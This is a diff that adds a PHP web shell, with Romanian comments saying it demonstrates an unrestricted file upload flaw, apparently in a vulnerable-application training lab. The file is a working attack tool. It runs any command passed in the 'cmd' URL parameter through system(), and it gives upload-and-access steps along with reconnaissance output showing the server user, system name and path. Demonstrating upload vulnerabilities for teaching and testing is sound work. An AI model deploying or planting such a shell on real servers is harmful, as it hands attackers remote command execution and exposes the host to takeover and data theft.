@@ -1,0 +1,29 @@
+<?php
+/**
+ * EXPLOIT: Web Shell (Remote Command Execution)
+ * Folosit pentru a demonstra vulnerabilitatea Unrestricted File Upload.
+ * 
+ * Utilizare:
+ * 1. Incarcati acest fisier prin file_upload.php
+ * 2. Accesati-l la: ../uploads/vuln/shell.php?cmd=ls
+ */
+
+if (isset($_GET['cmd'])) {
+    echo "<h3>Executie comanda: " . htmlspecialchars($_GET['cmd']) . "</h3>";
+    echo "<pre style='background: #000; color: #0f0; padding: 10px;'>";
+    // system() sau shell_exec() pot fi blocate pe unele servere,
+    // dar pe un server vulnerabil/configurat standard vor functiona.
+    system($_GET['cmd']);
+    echo "</pre>";
+} else {
+    echo "<h2>Web Shell Activ</h2>";
+    echo "<p>Parametrul 'cmd' lipseste. Exemplu: <code>shell.php?cmd=whoami</code></p>";
+    
+    // Afisare informatii utile despre server
+    echo "<ul>";
+    echo "<li><strong>User:</strong> " . posix_getpwuid(posix_geteuid())['name'] . "</li>";
+    echo "<li><strong>Server:</strong> " . php_uname() . "</li>";
+    echo "<li><strong>Current path:</strong> " . getcwd() . "</li>";
+    echo "</ul>";
+}
+?>
